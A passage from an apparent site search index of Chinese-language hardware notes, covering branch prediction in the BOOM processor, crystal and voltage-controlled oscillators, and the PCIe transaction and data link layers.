redirect)\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u5185\u200b\u5b8c\u6210\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u9762\u79ef\u200b\u80af\u5b9a\u200b\u4e0d\u80fd\u200b\u5927\u200b\uff0c\u200b\u5426\u5219\u200b\u65f6\u5e8f\u200b\u65e0\u6cd5\u200b\u6ee1\u8db3\u200b\uff0c\u200b\u6240\u4ee5\u200b BOOM \u200b\u91cc\u9762\u200b\u8fd8\u200b\u8bbe\u8ba1\u200b\u4e86\u200b 2-cycle \u200b\u548c\u200b 3-cycle \u200b\u7684\u200b\u6bd4\u8f83\u200b\u9ad8\u7ea7\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u8fd8\u6709\u200b\u9488\u5bf9\u200b\u51fd\u6570\u8c03\u7528\u200b\u7684\u200b RAS\uff08Return Address Stack\uff09\u3002</p> <p>\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u4e5f\u200b\u6709\u200b\u5f88\u591a\u200b\u65b9\u6cd5\u200b\u3002\u200b\u6bd4\u8f83\u7b80\u5355\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5b9e\u73b0\u200b\u4e00\u4e2a\u200b BHT\uff0c\u200b\u6bcf\u4e2a\u200b\u9879\u662f\u200b\u4e00\u4e2a\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9971\u548c\u200b\u8ba1\u6570\u5668\u200b\uff0c\u200b\u8d85\u8fc7\u200b\u4e00\u534a\u200b\u7684\u200b\u65f6\u5019\u200b\u589e\u52a0\u200b\uff0c\u200b\u5c11\u4e8e\u200b\u4e00\u534a\u200b\u65f6\u200b\u51cf\u5c11\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u9047\u5230\u200b\u4e86\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b/\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u8fd9\u79cd\u200b\u6765\u56de\u200b\u5207\u6362\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u51c6\u786e\u7387\u200b\u5c31\u200b\u5f88\u200b\u4f4e\u200b\u3002\u200b\u4e00\u4e2a\u200b\u590d\u6742\u200b\u4e00\u4e9b\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u5c31\u662f\u200b\u7528\u200b BHR\uff0c\u200b\u8bb0\u5f55\u200b\u8fd9\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u6700\u8fd1\u200b\u51e0\u6b21\u200b\u7684\u200b\u5386\u53f2\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u6bcf\u79cd\u200b\u53ef\u80fd\u200b\u7684\u200b\u5386\u53f2\u200b\uff0c\u200b\u90fd\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9971\u548c\u200b\u8ba1\u6570\u5668\u200b\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u9047\u5230\u200b\u521a\u624d\u200b\u6240\u8bf4\u200b\u7684\u200b\u60c5\u51b5\u200b\u5c31\u200b\u4f1a\u200b\u5f88\u200b\u597d\u200b\u5730\u200b\u9884\u6d4b\u200b\u3002\u200b\u4f46\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\u4f1a\u200b\u9047\u5230\u200b\u95ee\u9898\u200b\uff1a\u200b\u5982\u679c\u200b\u5728\u200b\u5199\u200b\u56de\u200b\u4e4b\u524d\u200b\uff0c\u200b\u53c8\u200b\u8fdb\u884c\u200b\u4e86\u200b\u4e00\u6b21\u200b\u9884\u6d4b\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u9884\u6d4b\u200b\u662f\u200b\u5728\u200b\u53d6\u6307\u200b\u7684\u200b\u65f6\u5019\u200b\u505a\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b\u66f4\u65b0\u200b BPU \u200b\u662f\u200b\u5728\u200b\u5199\u200b\u56de\u200b\u7684\u200b\u65f6\u5019\u200b\u5b8c\u6210\u200b\u7684\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u9884\u6d4b\u200b\u5c31\u662f\u200b\u57fa\u4e8e\u200b\u65e7\u200b\u7684\u200b\u72b6\u6001\u200b\u8fdb\u884c\u200b\u9884\u6d4b\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b BHR \u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e0d\u200b\u51c6\u786e\u200b\u7684\u200b\u95ee\u9898\u200b\uff1b\u200b\u800c\u4e14\u200b\u5199\u56de\u200b BPU \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u6309\u7167\u200b\u539f\u6765\u200b\u7684\u200b\u72b6\u6001\u200b\u8fdb\u884c\u200b\u66f4\u65b0\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u72b6\u6001\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u4e22\u5931\u200b\u4e00\u6b21\u200b\u66f4\u65b0\u200b\uff0c\u200b\u8bc6\u522b\u200b\u7684\u200b\u6a21\u5f0f\u200b\u4ece\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b/\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u200b\u8f6c\u53d8\u6210\u200b\u4e86\u200b\u8df3\u8f6c\u200b/\u200b\u8df3\u8f6c\u200b/\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53c8\u200b\u4f1a\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u3002\u200b\u4e00\u4e2a\u200b\u89e3\u51b3\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5728\u200b\u53d6\u6307\u200b\u9636\u6bb5\u200b\uff0cBPU \u200b\u9884\u6d4b\u200b\u5b8c\u200b\u5c31\u200b\u7acb\u5373\u200b\u6309\u7167\u200b\u9884\u6d4b\u200b\u7684\u200b\u7ed3\u679c\u200b\u66f4\u65b0\u200b BHR\uff0c\u200b\u4e4b\u540e\u200b\u5199\u56de\u200b\u9636\u6bb5\u200b\u4f1a\u200b\u6062\u590d\u200b\u5230\u200b\u5b9e\u9645\u200b\u7684\u200b BHR \u200b\u53d6\u503c\u200b\u3002\u200b\u8bba\u6587\u200b The effect of speculatively updating branch history on branch prediction accuracy, revisited \u200b\u548c\u200b Speculative Updates of Local and Global Branch History: A Quantitative Analysis \u200b\u8ba8\u8bba\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u5bf9\u200b\u6027\u80fd\u200b\u7684\u200b\u5f71\u54cd\u200b\u3002</p> <p>\u200b\u6bd4\u8f83\u200b\u5bb9\u6613\u200b\u505a\u200b\u9884\u6d4b\u200b\u66f4\u65b0\u200b\u548c\u200b\u6062\u590d\u200b\u7684\u200b\u662f\u200b\u5168\u5c40\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7ef4\u62a4\u200b\u4e24\u4e2a\u200b GHR\uff08Global History Register\uff09\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b\u76ee\u524d\u200b\u53d6\u6307\u4ee4\u200b\u6700\u65b0\u200b\u7684\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b\u63d0\u4ea4\u200b\u7684\u200b\u6700\u65b0\u200b\u7684\u200b\u3002\u200b\u5728\u200b\u9884\u6d4b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7528\u200b GHR \u200b\u53bb\u200b\u627e\u200b\u5bf9\u5e94\u200b\u7684\u200b 2-bit \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u9884\u6d4b\u200b\u7ed3\u679c\u200b\u66f4\u65b0\u200b\u5230\u200b GHR \u200b\u4e0a\u200b\u3002\u200b\u5728\u200b\u9884\u6d4b\u200b\u5931\u8d25\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b GHR \u200b\u6062\u590d\u200b\u4e3a\u200b\u63d0\u4ea4\u200b\u7684\u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u652f\u6301\u200b\u4e00\u4e2a\u200b Fetch Packet \u200b\u4e2d\u6709\u200b\u591a\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b GHR \u200b\u5bf9\u5e94\u200b\u82e5\u5e72\u4e2a\u200b 2-bit \u200b\u72b6\u6001\u200b\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u76f8\u5e94\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5f53\u7136\u200b\u8fd9\u6837\u200b\u9762\u79ef\u200b\u4e5f\u200b\u4f1a\u200b\u589e\u52a0\u200b\u5f88\u591a\u200b\u3002</p>"},{"location":"hardware/oscillator.html","title":"\u632f\u8361\u5668","text":"<p>\u200b\u632f\u8361\u5668\u200b\uff08Oscillator\uff09\u200b\u5728\u200b\u7535\u8def\u200b\u4e2d\u200b\u7528\u4e8e\u200b\u751f\u6210\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u3002\u200b\u632f\u8361\u5668\u200b\u6839\u636e\u200b\u539f\u7406\u200b\u53ef\u4ee5\u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7c7b\u578b\u200b\uff1a</p> <ol> <li>Harmonic Oscillator\uff1a\u200b\u632f\u8361\u5668\u200b\u7531\u200b\u653e\u5927\u5668\u200b\u548c\u200b\u6ee4\u6ce2\u5668\u200b\u7ec4\u6210\u200b\uff0c\u200b\u8f93\u51fa\u200b\u4e00\u4e2a\u200b\u6b63\u5f26\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b</li> <li>Relaxation Oscillator\uff1a\u200b\u8f93\u51fa\u200b\u65b9\u6ce2\u200b\u6216\u8005\u200b\u952f\u9f7f\u200b\u6ce2\u200b\u6216\u8005\u200b\u4e09\u89d2\u200b\u6ce2\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b</li> </ol>"},{"location":"hardware/oscillator.html#_2","title":"\u6676\u4f53\u632f\u8361\u5668","text":"<p>\u200b\u6676\u4f53\u632f\u8361\u5668\u200b\uff08Crystal oscillator\uff09\u200b\u7b80\u79f0\u200b\u6676\u632f\u200b\uff0c\u200b\u5e38\u89c1\u4e8e\u200b PCB\uff0c\u200b\u7528\u6765\u200b\u7ed9\u200b\u82af\u7247\u200b\u63d0\u4f9b\u200b\u5916\u90e8\u200b\u7684\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u6676\u632f\u662f\u200b\u4e2a\u200b\u88ab\u52a8\u200b\u5143\u4ef6\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5b83\u200b\u4e0d\u4f1a\u200b\u81ea\u52a8\u200b\u751f\u6210\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u82af\u7247\u200b\u5185\u90e8\u200b\u7684\u200b\u7535\u8def\u200b\u8fdb\u884c\u200b\u914d\u5408\u200b\u3002</p> <p>\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u4f7f\u7528\u200b\u6676\u632f\u200b\u4ea7\u751f\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u7684\u200b\u7535\u8def\u200b\u662f\u200b Pierce oscillator\uff1a</p> <p> </p> Pierce oscillator\uff08\u200b\u56fe\u6e90\u200b\u7ef4\u57fa\u767e\u79d1\u200b\uff09 <p>\u200b\u5176\u4e2d\u200b \\(U_1\\) \u200b\u662f\u200b\u53cd\u76f8\u5668\u200b\uff08Inverter\uff09\uff0c\\(X_1\\) \u200b\u662f\u200b\u6676\u632f\u200b\u3002\u200b\u6709\u65f6\u5019\u200b\u7535\u8def\u200b\u8fd8\u4f1a\u200b\u6dfb\u52a0\u200b\u4e0a\u56fe\u200b\u4e2d\u200b\u6ca1\u6709\u200b\u753b\u51fa\u200b\u7684\u200b\u989d\u5916\u200b\u7684\u200b\u7535\u963b\u200b\u6216\u200b\u7535\u5bb9\u200b\u3002</p> <p>\u200b\u5728\u200b\u5d4c\u5165\u5f0f\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u82af\u7247\u200b\u6709\u200b XI \u200b\u548c\u200b XO \u200b\u5f15\u811a\u200b\uff0c\u200b\u8fde\u63a5\u200b\u5230\u200b PCB \u200b\u4e0a\u200b\u7684\u200b\u6676\u632f\u200b\u4ee5\u53ca\u200b\u4e24\u4e2a\u200b\u7535\u5bb9\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e0a\u200b\u56fe\u200b\u7684\u200b \\(X_1\\)\u3001\\(C_1\\) \u200b\u548c\u200b \\(C_2\\)\uff0c\u200b\u800c\u200b\u4e0a\u200b\u56fe\u200b\u4e2d\u200b\u7684\u200b \\(U_1\\) \u200b\u548c\u200b \\(R_1\\) \u200b\u653e\u5728\u200b\u82af\u7247\u200b\u5185\u90e8\u200b\u3002\u200b\u56e0\u6b64\u200b\u5728\u200b\u5f88\u591a\u200b\u82af\u7247\u200b\u7684\u200b\u6587\u6863\u200b\u4e2d\u200b\uff0c\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u7c7b\u4f3c\u200b\u4e0b\u9762\u200b\u7684\u200b\u793a\u610f\u56fe\u200b\uff1a</p> <p> </p> \u200b\u6676\u632f\u200b\u4e0e\u200b\u82af\u7247\u200b\u7684\u200b\u8fde\u63a5\u200b\uff08\u200b\u56fe\u6e90\u200bKSZ9031RNX Datasheet\uff09 <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b\u6676\u632f\u200b\uff08\\(X_1\\)\uff09\u200b\u662f\u200b\u65e0\u6e90\u200b\u6676\u632f\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u4e00\u4e2a\u200b\u54c1\u8d28\u56e0\u6570\u200b\uff08Q factor\uff09\u200b\u5f88\u200b\u9ad8\u200b\u7684\u200b\u6ee4\u6ce2\u5668\u200b\uff0c\u200b\u9700\u8981\u200b\u501f\u52a9\u200b\u82af\u7247\u200b\u5185\u200b\u7684\u200b\u632f\u8361\u7535\u8def\u200b\u624d\u200b\u53ef\u4ee5\u200b\u4ea7\u751f\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u72ec\u7acb\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u79f0\u4f5c\u200b\u65e0\u6e90\u200b\u6676\u632f\u200b\u3002\u200b\u5982\u679c\u200b\u628a\u200b Pierce oscillator \u200b\u7535\u8def\u200b\u548c\u200b\u6676\u632f\u200b\u7ec4\u5408\u200b\u5728\u200b\u4e00\u4e2a\u200b\u82af\u7247\u200b\u91cc\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u6709\u6e90\u200b\u6676\u632f\u200b\u3002\u200b\u5f88\u591a\u200b\u82af\u7247\u200b\u65e2\u200b\u652f\u6301\u200b\u65e0\u6e90\u200b\u6676\u632f\u200b\uff08\u200b\u63a5\u200b XI \u200b\u548c\u200b XO\uff09\uff0c\u200b\u53c8\u200b\u652f\u6301\u200b\u6709\u6e90\u200b\u6676\u632f\u200b\uff08\u200b\u53ea\u63a5\u200b XI\uff0c\u200b\u4e0d\u63a5\u200b XO\uff09\u3002</p> <p>Pierce oscillator \u200b\u8f93\u51fa\u200b\u7684\u200b\u662f\u200b\u6b63\u5f26\u6ce2\u200b\uff0c\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u53d8\u6210\u200b\u65b9\u6ce2\u200b\u4f9b\u200b\u6570\u5b57\u7535\u8def\u200b\u4f7f\u7528\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u518d\u200b\u7ecf\u8fc7\u200b\u4e00\u4e2a\u200b\u53cd\u76f8\u5668\u200b\u3002</p> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b\u6676\u632f\u200b\u6750\u6599\u200b\u6709\u200b\u77f3\u82f1\u200b\uff08Quartz\uff09\u200b\u548c\u200b\u9676\u74f7\u200b\uff08Ceramics\uff09\uff0c\u200b\u4e00\u822c\u200b\u77f3\u82f1\u200b\u7cbe\u5ea6\u200b\u66f4\u9ad8\u200b\u3002</p> <p>XTAL \u200b\u662f\u200b Crystal \u200b\u7684\u200b\u7f29\u5199\u200b\uff0cXO \u200b\u662f\u200b Crystal Oscillator \u200b\u7684\u200b\u7f29\u5199\u200b\u3002\u200b\u7531\u4e8e\u200b XO \u200b\u6bd4\u200b XTAL \u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u632f\u8361\u5668\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u822c\u200b XTAL \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u65e0\u6e90\u200b\u6676\u632f\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6676\u4f53\u200b\u672c\u8eab\u200b\uff0cXO \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u6709\u6e90\u200b\u6676\u632f\u200b\u3002</p>"},{"location":"hardware/oscillator.html#voltage-controlled-oscillator","title":"Voltage Controlled Oscillator","text":"<p>Voltage Controlled Oscillator \u200b\u662f\u200b\u538b\u63a7\u200b\u632f\u8361\u5668\u200b\uff0c\u200b\u7f29\u5199\u200b VCO\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7531\u200b\u7535\u538b\u200b\u63a7\u5236\u200b\u7684\u200b\u632f\u8361\u5668\u200b\uff0c\u200b\u5728\u200b\u9501\u76f8\u73af\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b VCO \u200b\u7684\u200b\u8eab\u5f71\u200b\u3002</p> <p>\u200b\u4ee5\u200b LC \u200b\u632f\u8361\u7535\u8def\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5176\u200b\u632f\u8361\u200b\u9891\u7387\u200b\u4e0e\u200b\u7535\u611f\u200b\u548c\u200b\u7535\u5bb9\u200b\u5927\u5c0f\u200b\u6709\u5173\u200b\uff0c\u200b\u5982\u679c\u200b\u53ef\u4ee5\u200b\u63a7\u5236\u200b\u7535\u5bb9\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u95f4\u63a5\u200b\u5730\u200b\u63a7\u5236\u200b\u632f\u8361\u5668\u200b\u7684\u200b\u632f\u8361\u200b\u9891\u7387\u200b\u3002\u200b\u800c\u200b P-N \u200b\u7ed3\u200b\u5de5\u4f5c\u200b\u5728\u200b\u53cd\u5411\u200b\u504f\u7f6e\u200b\u72b6\u6001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5176\u200b\u7535\u5bb9\u200b\u5927\u5c0f\u200b\u4e0e\u200b\u4e24\u7aef\u200b\u7684\u200b\u7535\u538b\u200b\u76f8\u5173\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7528\u200b P-N \u200b\u7ed3\u548c\u200b LC \u200b\u632f\u8361\u7535\u8def\u200b\u6765\u200b\u5b9e\u73b0\u200b VCO\u3002</p>"},{"location":"hardware/pcie.html","title":"PCIe (Peripheral Component Interconnect Express)","text":""},{"location":"hardware/pcie.html#_1","title":"\u5206\u5c42","text":"<p>PCIe \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e09\u4e2a\u200b\u5c42\u200b\uff1aTransaction Layer\uff0cData Link Layer\uff0cPhysical Layer\uff0c\u200b\u548c\u200b TCP/IP \u200b\u56db\u5c42\u200b\u6a21\u578b\u200b\u5f88\u200b\u50cf\u200b\u3002PCIe \u200b\u4e5f\u200b\u662f\u200b\u57fa\u4e8e\u200b Packet \u200b\u4f20\u8f93\u200b\u7684\u200b\u3002</p> <p> </p> PCIe \u200b\u5206\u5c42\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09"},{"location":"hardware/pcie.html#transaction-layer","title":"Transaction Layer","text":"<p>Transaction Layer \u200b\u7684\u200b\u6838\u5fc3\u200b\u662f\u200b Transaction Layer Packet(TLP)\u3002TLP \u200b\u683c\u5f0f\u200b\uff1a</p> <p> </p> PCIe TLP \u200b\u683c\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09 <p>\u200b\u5373\u53ef\u200b\u9009\u200b\u7684\u200b\u82e5\u5e72\u4e2a\u200b Prefix\uff0c\u200b\u4e00\u4e2a\u200b Header\uff0c\u200b\u53ef\u9009\u200b\u7684\u200b Data Payload\uff0c\u200b\u53ef\u9009\u200b\u7684\u200b Digest\u3002</p> <p>Prefix \u200b\u548c\u200b Header \u200b\u5f00\u5934\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u662f\u200b <code>Fmt[2:0]</code> \u200b\u548c\u200b <code>Type[4:0]</code> \u200b\u5b57\u200b\u6bb5\u200b\u3002Fmt \u200b\u51b3\u5b9a\u200b\u4e86\u200b header \u200b\u7684\u200b\u957f\u5ea6\u200b\uff0c\u200b\u6709\u65e0\u200b\u6570\u636e\u200b\uff0c\u200b\u6216\u8005\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b Prefix\u3002</p> <p>\u200b\u5b83\u200b\u652f\u6301\u200b\u51e0\u7c7b\u200b Packet\uff1a</p> <ul> <li>Memory: MMIO<ul> <li>Read Request(MRd)/Completion(CplD)</li> <li>Write Request(MWr): \u200b\u6ce8\u610f\u200b\u53ea\u6709\u200b Request\uff0c\u200b\u6ca1\u6709\u200b Completion</li> <li>AtomicOp Request(FetchAdd/Swap/CAS)/Completion(CplD)</li> <li>Locked Memory Read(MRdLk)/Completion(CplDLk): Legacy</li> </ul> </li> <li>IO: Legacy<ul> <li>Read Request(IORd)/Completion(CplD)</li> <li>Write Request(IOWr)/Completion(Cpl)</li> </ul> </li> <li>Configuration: \u200b\u8bbf\u95ee\u200b\u914d\u7f6e\u200b\u7a7a\u95f4\u200b<ul> <li>Read Request(CfgRd0/CfgRd1)/Completion(CplD)</li> <li>Write Request(CfgWr0/CfgWr1)/Completion(Cpl)</li> </ul> </li> <li>Message: \u200b\u4f20\u8f93\u200b event<ul> <li>Request(Msg/MsgD)</li> </ul> </li> </ul> <p>\u200b\u62ec\u53f7\u200b\u91cc\u200b\u7684\u200b\u662f\u200b TLP Type\uff0c\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u5b83\u200b Fmt \u200b\u548c\u200b Type \u200b\u5b57\u6bb5\u200b\u7684\u200b\u53d6\u503c\u200b\u3002\u200b\u5982\u679c\u200b Completion \u200b\u5931\u8d25\u200b\u4e86\u200b\uff0c\u200b\u539f\u6765\u200b\u5e94\u8be5\u200b\u662f\u200b CplD/CplDLk \u200b\u7684\u200b Completion \u200b\u4f1a\u200b\u53d8\u6210\u200b\u4e0d\u5e26\u200b\u6570\u636e\u200b\u7684\u200b Cpl/CplLk\u3002</p> <p>\u200b\u5728\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\u7684\u200b\u8868\u200b 2-3 \u200b\u4e2d\u200b\u5217\u51fa\u200b\u4e86\u200b TLP Type \u200b\u4ee5\u53ca\u200b\u5bf9\u5e94\u200b\u7684\u200b Fmt \u200b\u548c\u200b Type \u200b\u7f16\u7801\u200b\u3002</p> <p>TLP \u200b\u8def\u7531\u200b\u6709\u200b\u4e09\u4e2a\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u8fd9\u4e2a\u200b TLP \u200b\u76ee\u7684\u5730\u200b\u662f\u200b\u54ea\u91cc\u200b\uff1a</p> <ul> <li>Address-based: 32 \u200b\u4f4d\u200b\u6216\u200b 64 \u200b\u4f4d\u200b\u5730\u5740\u200b\uff0c\u200b\u7528\u4e8e\u200b Memory \u200b\u548c\u200b IO \u200b\u8bf7\u6c42\u200b</li> <li>ID-based\uff1alspci \u200b\u770b\u5230\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b Bus Device Function\uff0c\u200b\u7528\u4e8e\u200b Configuration \u200b\u8bf7\u6c42\u200b</li> <li>Implicit\uff1a\u200b\u7528\u4e8e\u200b Message \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8def\u7531\u200b\u65b9\u6cd5\u200b\uff1a<ul> <li>Routed to Root Complex</li> <li>Routed by Address: PCIe 3.0 \u200b\u6807\u51c6\u200b\u4e2d\u200b\u6ca1\u6709\u200b\u7528\u200b\u8fd9\u4e2a\u200b\u8def\u7531\u200b\u65b9\u6cd5\u200b\u7684\u200b Message</li> <li>Routed by ID</li> <li>Broadcast from Root Complex</li> <li>Local - Terminate at Receiver</li> <li>Gathered and router to Root Complex</li> </ul> </li> </ul>"},{"location":"hardware/pcie.html#data-link-layer","title":"Data Link Layer","text":"<p>Data Link Layer \u200b\u7684\u200b\u4e3b\u8981\u200b\u529f\u80fd\u200b\u662f\u200b\u8fdb\u884c\u200b TLP \u200b\u7684\u200b\u53ef\u9760\u200b\u4f20\u8f93\u200b\u3002\u200b\u5b83\u200b\u5728\u200b\u4f20\u8f93\u200b TLP \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u5728\u200b\u5f00\u5934\u200b\u52a0\u4e0a\u200b\u4e00\u4e2a\u200b\u4e24\u200b\u5b57\u8282\u200b\u7684\u200b Sequence Number\uff0c\u200b\u6700\u540e\u200b\u52a0\u4e0a\u200b\u4e00\u4e2a\u200b\u56db\u200b\u5b57\u8282\u200b\u7684\u200b LCRC\uff08Link CRC\uff09\u3002</p> <p> </p> PCIe TLP Data Link Layer \u200b\u683c\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09 <p>\u200b\u9664\u4e86\u200b\u4f20\u8f93\u200b TLP\uff0cData Link Layer \u200b\u8fd8\u4f1a\u200b\u4f20\u8f93\u200b Data Link Layer Packet(DLLP)\uff0c\u200b\u7c7b\u578b\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>Ack DLLP: \u200b\u544a\u8bc9\u200b\u5bf9\u65b9\u200b\u81ea\u5df1\u200b\u5df2\u7ecf\u200b\u6210\u529f\u200b\u6536\u5230\u200b\u4e86\u200b TLP</li> <li>Nak DLLP\uff1a\u200b\u544a\u8bc9\u200b\u5bf9\u65b9\u200b\u81ea\u5df1\u200b\u63a5\u6536\u200b TLP \u200b\u5931\u8d25\u200b\uff0c\u200b\u8bf7\u200b\u91cd\u8bd5\u200b</li> <li>InitFC1/InitFC2/UpdateFC DLLPs\uff1a\u200b\u6d41\u91cf\u200b\u63a7\u5236\u200b</li> <li>PM_Enter_L1/PM_Enter_L23/PM_Active_State_Request_L1/PM_Request_Ack\uff1a\u200b\u7528\u4e8e\u200b\u7535\u6e90\u200b\u7ba1\u7406\u200b</li> </ul> <p>Data Link Layer \u200b\u6536\u5230\u200b\u4e0a\u5c42\u200b\u8981\u200b\u53d1\u9001\u200b TLP \u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u62fc\u63a5\u200b Sequence Number \u200b\u548c\u200b LCRC\uff0c\u200b\u7136\u540e\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u5728\u200b retry buffer \u200b\u4e2d\u200b\uff0c\u200b\u901a\u8fc7\u200b Physical Layer \u200b\u53d1\u9001\u200b\u3002\u200b\u4ece\u200b Physical Layer \u200b\u6536\u5230\u200b\u65b0\u200b\u7684\u200b TLP/DLLP \u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u68c0\u67e5\u200b\u5b83\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\uff08CRC\uff09\uff0c\u200b\u5982\u679c\u200b\u6b63\u786e\u200b\uff0c\u200b\u5c31\u200b\u5411\u200b\u53d1\u9001\u200b\u65b9\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b Ack DLLP\uff0c\u200b\u5e76\u200b\u628a\u200b TLP \u200b\u63d0\u4ea4\u200b\u7ed9\u200b Transaction Layer\uff1b\u200b\u5982\u679c\u200b\u4e0d\u200b\u6b63\u786e\u200b\uff0c\u200b\u5c31\u200b\u5411\u200b\u53d1\u9001\u200b\u65b9\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b Nak DLLP\u3002\u200b\u5982\u679c\u200b\u6536\u5230\u200b\u4e86\u200b Ack 